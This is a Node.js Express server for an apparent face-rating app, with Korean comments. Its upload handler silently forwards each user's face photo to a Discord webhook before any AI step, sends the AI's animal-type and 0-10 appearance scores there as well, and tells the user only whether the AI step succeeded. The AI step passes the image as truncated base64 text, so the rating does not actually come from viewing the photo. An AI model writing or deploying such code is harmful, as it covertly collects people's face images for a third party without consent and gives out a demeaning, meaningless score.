import express from "express";
import multer from "multer";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";
import { OpenAI } from "openai";

const app = express();
const PORT = process.env.PORT || 10000;

// 🔐 환경변수
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

// OpenAI (있어도 되고 없어도 됨)
const openai = OPENAI_API_KEY
  ? new OpenAI({ apiKey: OPENAI_API_KEY })
  : null;

// multer 설정
const upload = multer({
  dest: "uploads/",
  limits: { fileSize: 5 * 1024 * 1024 } // 5MB
});

// uploads 폴더 보장
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

app.use(express.json());
app.use(express.static("."));

app.post("/upload", upload.single("photo"), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: "사진 없음" });
  }

  const filePath = req.file.path;

  // ===============================
  // 1️⃣ 사진을 무조건 Discord로 먼저 전송
  // ===============================
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));
    form.append(
      "payload_json",
      JSON.stringify({
        username: "📸 얼굴 업로드",
        content: "새로운 사진 업로드됨 (AI 평가와 무관)"
      })
    );

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      body: form
    });

    console.log("✅ 디스코드 사진 전송 성공");
  } catch (err) {
    console.error("❌ 디스코드 사진 전송 실패", err.message);
  }

  // ===============================
  // 2️⃣ AI 평가 시도 (실패해도 OK)
  // ===============================
  let aiResult = {
    success: false,
    message: "AI 평가 실패"
  };

  if (openai) {
    try {
      const imageBuffer = fs.readFileSync(filePath);
      const base64Image = imageBuffer.toString("base64").slice(0, 12000);

      const completion = await openai.chat.completions.create({
        model: "gpt-4o-mini",
        messages: [
          {
            role: "system",
            content: "너는 얼굴을 솔직하게 평가하는 AI다."
          },
          {
            role: "user",
            content: `
이 얼굴 사진을 보고:
- 동물상
- 솔직한 외모 평가 (0~10점)
JSON 형식으로만 답해라.

Base64 이미지 일부:
${base64Image}
`
          }
        ]
      });

      aiResult = {
        success: true,
        raw: completion.choices[0].message.content
      };

      // AI 결과도 Discord로 추가 전송
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "🤖 AI 얼평 결과",
          content: aiResult.raw
        })
      });

      console.log("✅ AI 평가 성공");
    } catch (err) {
      console.error("⚠️ AI 실패:", err.message);
    }
  }

  // ===============================
  // 3️⃣ 사용자 응답 (AI 성공/실패만 알려줌)
  // ===============================
  res.json({
    ok: true,
    ai: aiResult.success ? "success" : "fail"
  });

  // ===============================
  // 4️⃣ 파일 정리 (맨 마지막)
  // ===============================
  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});
